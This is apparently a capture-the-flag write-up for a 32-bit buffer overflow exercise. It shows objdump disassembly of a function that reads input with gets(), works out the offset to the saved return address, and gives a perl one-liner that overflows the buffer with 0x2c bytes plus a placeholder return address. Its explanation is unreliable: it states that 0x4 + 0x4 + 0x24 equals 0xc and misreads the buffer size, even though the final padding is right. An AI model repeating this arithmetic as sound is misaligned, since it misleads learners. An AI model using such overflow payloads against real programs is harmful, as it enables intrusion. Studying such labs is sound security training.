# Buffer Overflow 1

Inspecting the dump of the vulnerable function:

``` console
$ objdump -d -Mintel vuln | sed -n '/^[a-f0-9]\+ <vuln>/,/^$/p' 
08049281 <vuln>:
 8049281:	f3 0f 1e fb          	endbr32 
 8049285:	55                   	push   ebp
 8049286:	89 e5                	mov    ebp,esp
 8049288:	53                   	push   ebx
 8049289:	83 ec 24             	sub    esp,0x24
 804928c:	e8 9f fe ff ff       	call   8049130 <__x86.get_pc_thunk.bx>
 8049291:	81 c3 6f 2d 00 00    	add    ebx,0x2d6f
 8049297:	83 ec 0c             	sub    esp,0xc
 804929a:	8d 45 d8             	lea    eax,[ebp-0x28]
 804929d:	50                   	push   eax
 804929e:	e8 ad fd ff ff       	call   8049050 <gets@plt>
 80492a3:	83 c4 10             	add    esp,0x10
 80492a6:	e8 93 00 00 00       	call   804933e <get_return_address>
 80492ab:	83 ec 08             	sub    esp,0x8
 80492ae:	50                   	push   eax
 80492af:	8d 83 64 e0 ff ff    	lea    eax,[ebx-0x1f9c]
 80492b5:	50                   	push   eax
 80492b6:	e8 85 fd ff ff       	call   8049040 <printf@plt>
 80492bb:	83 c4 10             	add    esp,0x10
 80492be:	90                   	nop
 80492bf:	8b 5d fc             	mov    ebx,DWORD PTR [ebp-0x4]
 80492c2:	c9                   	leave  
 80492c3:	c3                   	ret    
```

From the code we see that our buffer has length `0x24`, so the instruction at
`0x8049289` is allocating this. Since the return address will be at the top of
the stack we just need to check how many bytes we have to overwrite before we
stomp that, so glancing at the first few instructions:

``` 
08049281 <vuln>:
 8049281:	f3 0f 1e fb          	endbr32 
 8049285:	55                   	push   ebp      <--- -0x4
 8049286:	89 e5                	mov    ebp,esp
 8049288:	53                   	push   ebx      <--- -0x4
 8049289:	83 ec 24             	sub    esp,0x24 <--- -0x24
```

So it should suffice to write `0x4 + 0x4 + 0x24 = 0xc` bytes before writing the
address, so we could construct our payload like:

``` console
perl -E 'say("A" x 0x2c . "\xff\xff\xff\xff")' | ./vuln
```

Where `"\xff\xff\xff\xff"` is the address we read of the disassembled binary
(there doesn't appear to be any address randomisation; the function is at the
same address each run).
